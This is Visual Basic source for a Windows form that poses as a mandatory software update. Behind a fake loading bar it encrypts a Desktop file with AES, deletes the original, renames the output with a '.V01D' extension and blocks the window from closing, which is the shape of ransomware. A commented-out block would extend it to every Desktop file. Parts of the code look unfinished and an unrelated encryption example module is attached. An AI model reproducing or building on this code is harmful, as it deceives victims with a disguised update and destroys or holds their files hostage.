Imports System
Imports System.IO
Imports System.Security
Imports System.Security.Cryptography

Class Update
    Dim strFileToEncrypt As String
    Dim strFileToDecrypt As String
    Dim strOutputEncrypt As String
    Dim strOutputDecrypt As String
    Dim fsInput As System.IO.FileStream
    Dim fsOutput As System.IO.FileStream
    Public Function ranStr(ByRef len As Integer, ByRef upper As Boolean) As String
        Dim rand As New Random()
        Dim allowableChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{};:/?.,<>`~".ToCharArray()
        Dim final As String = String.Empty
        For i As Integer = 0 To len - 1
            final += allowableChars(rand.Next(allowableChars.Length - 1))
        Next
        Return CType(IIf(upper, final.ToUpper(), final), String)
    End Function
    Private Function CreateKey(ByVal strPassword As String) As Byte()
        Dim chrData() As Char = strPassword.ToCharArray
        Dim intLength As Integer = chrData.GetUpperBound(0)
        Dim bytDataToHash(intLength) As Byte
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next
        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        Dim bytKey(31) As Byte

        For i As Integer = 0 To 31
            bytKey(i) = bytResult(i)
        Next
        Return bytKey
    End Function
    Private Function CreateIV(ByVal strPassword As String) As Byte()
        Dim chrData() As Char = strPassword.ToCharArray
        Dim intLength As Integer = chrData.GetUpperBound(0)
        Dim bytDataToHash(intLength) As Byte
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next
        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        Dim bytIV(15) As Byte
        For i As Integer = 32 To 47
            bytIV(i - 32) = bytResult(i)
        Next
        Return bytIV
    End Function
    Private Enum CryptoAction
        'Define the enumeration for CryptoAction.
        ActionEncrypt = 1
        ActionDecrypt = 2
    End Enum

    Private Sub EncryptOrDecryptFile(ByVal strInputFile As String,
                                 ByVal strOutputFile As String,
                                 ByVal bytKey() As Byte,
                                 ByVal bytIV() As Byte,
                                 ByVal Direction As CryptoAction)
        Try
            fsInput = New System.IO.FileStream(strInputFile, FileMode.Open,
                                              FileAccess.Read)
            fsOutput = New System.IO.FileStream(strOutputFile,
                                               FileMode.OpenOrCreate,
                                               FileAccess.Write)
            fsOutput.SetLength(0) 'make sure fsOutput is empty
            'Declare variables for encrypt/decrypt process.
            Dim bytBuffer(4096) As Byte 'holds a block of bytes for processing
            Dim lngBytesProcessed As Long = 0 'running count of bytes processed
            Dim lngFileLength As Long = fsInput.Length 'the input file's length
            Dim intBytesInCurrentBlock As Integer 'current bytes being processed
            Dim csCryptoStream As CryptoStream
            'Declare your CryptoServiceProvider.
            Dim cspRijndael As New System.Security.Cryptography.RijndaelManaged
            'Determine if ecryption or decryption and setup CryptoStream.
            Select Case Direction
                Case CryptoAction.ActionEncrypt
                    csCryptoStream = New CryptoStream(fsOutput,
                cspRijndael.CreateEncryptor(bytKey, bytIV),
                CryptoStreamMode.Write)
                Case CryptoAction.ActionDecrypt
                    csCryptoStream = New CryptoStream(fsOutput,
                cspRijndael.CreateDecryptor(bytKey, bytIV),
                CryptoStreamMode.Write)
            End Select
            'Use While to loop until all of the file is processed.
            While lngBytesProcessed < lngFileLength
                'Read file with the input filestream.
                intBytesInCurrentBlock = fsInput.Read(bytBuffer, 0, 4096)
                'Write output file with the cryptostream.
#Disable Warning BC42104 ' Variable is used before it has been assigned a value
                csCryptoStream.Write(bytBuffer, 0, intBytesInCurrentBlock)
#Enable Warning BC42104 ' Variable is used before it has been assigned a value
                'Update lngBytesProcessed
                lngBytesProcessed = lngBytesProcessed +
                                    CLng(intBytesInCurrentBlock)
            End While
            'Close FileStreams and CryptoStream.
            csCryptoStream.Close()
            fsInput.Close()
            fsOutput.Close()

            strFileToEncrypt = "C:\Users\user\Desktop\File.txt"
            Dim iPosition As Integer = 0
            Dim i As Integer = 0

            'Get the position of the last "\" in the OpenFileDialog.FileName path.
            '-1 is when the character your searching for is not there.
            'IndexOf searches from left to right.
            While strFileToEncrypt.IndexOf("\"c, i) <> -1
                iPosition = strFileToEncrypt.IndexOf("\"c, i)
                i = iPosition + 1
            End While
            Dim fileDest As String
            'Assign strOutputFile to the position after the last "\" in the path.
            'This position is the beginning of the file name.
            strOutputEncrypt = strFileToEncrypt.Substring(iPosition + 1)
            'Assign S the entire path, ending at the last "\".
            Dim S As String = strFileToEncrypt.Substring(0, iPosition + 1)
            'Replace the "." in the file extension with "_".
            strOutputEncrypt = strOutputEncrypt.Replace("."c, "_"c)
            'The final file name.  XXXXX.encrypt
            fileDest = S + strOutputEncrypt + ".V01D"
        Catch
            Return
        End Try
    End Sub
    Dim FileName As String = "C:\Users\user\Desktop\File.txt"    'Default input file
    Dim OutputFile As String = "C:\Users\user\Desktop\Encrypted.V01D" 'Default output file
    Dim r As String = ranStr(300, False)
    Dim bytKey As Byte() = CreateKey(r)
    Dim bytIV As Byte() = CreateIV(r)
    Dim f As Integer
    Private Sub ContBtn_Click(sender As Object, e As EventArgs) Handles ContBtn.Click
        ContBtn.Text = "Please Wait"

        ContBtn.Enabled = False
        For X = 1 To 100 Step 1                      'Begin for loop for a pseudo-loading progress bar
            ProgressBar1.Value = X
            f = CInt(Math.Ceiling(Rnd() * 100)) + 1 'Generate a pseudo-random integer between 1-1000 and set it as f
            System.Threading.Thread.Sleep(f)         'Wait f milliseconds to give the impression of loading to user
        Next X
        EncryptOrDecryptFile(FileName, OutputFile, bytKey, bytIV, CryptoAction.ActionEncrypt)
        My.Computer.FileSystem.DeleteFile(FileName)
        MessageBox.Show(r, "", MessageBoxButtons.OK, MessageBoxIcon.Information)
        'Dim encList As List(Of String)
        'For Each foundFile As String In My.Computer.FileSystem.GetFiles(
        'My.Computer.FileSystem.SpecialDirectories.Desktop)
        'encList.Items.Add(foundFile)
        'Next
        ContBtn.Text = "Done"
        CancelBtn.Text = "Exit"
        CancelBtn.Enabled = True
    End Sub

    Private Sub CancelBtn_Click(sender As Object, e As EventArgs) Handles CancelBtn.Click
        EncryptOrDecryptFile(OutputFile, FileName, bytKey, bytIV, CryptoAction.ActionDecrypt)
        My.Computer.FileSystem.DeleteFile(OutputFile)
        Form2.Show()
        Me.Hide()
    End Sub

    Private Sub Update_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        MessageBox.Show("Sorry but this update is mandatory",
        "Error", MessageBoxButtons.OK, MessageBoxIcon.Stop)
        e.Cancel = True
    End Sub
End Class

Module FileExample
    Sub Main()
        Try
            Dim FileName As String = "C:\Users\user\Desktop\File.txt"
            Console.WriteLine("Encrypt " + FileName)
            AddEncryption(FileName)
            Console.WriteLine("Decrypt " + FileName)
            RemoveEncryption(FileName)
            Console.WriteLine("Done")
        Catch e As Exception
            Console.WriteLine(e)
        End Try
        Console.ReadLine()
    End Sub
    Sub AddEncryption(ByVal FileName As String)
        File.Encrypt(FileName)
    End Sub
    Sub RemoveEncryption(ByVal FileName As String)
        File.Decrypt(FileName)
    End Sub
End Module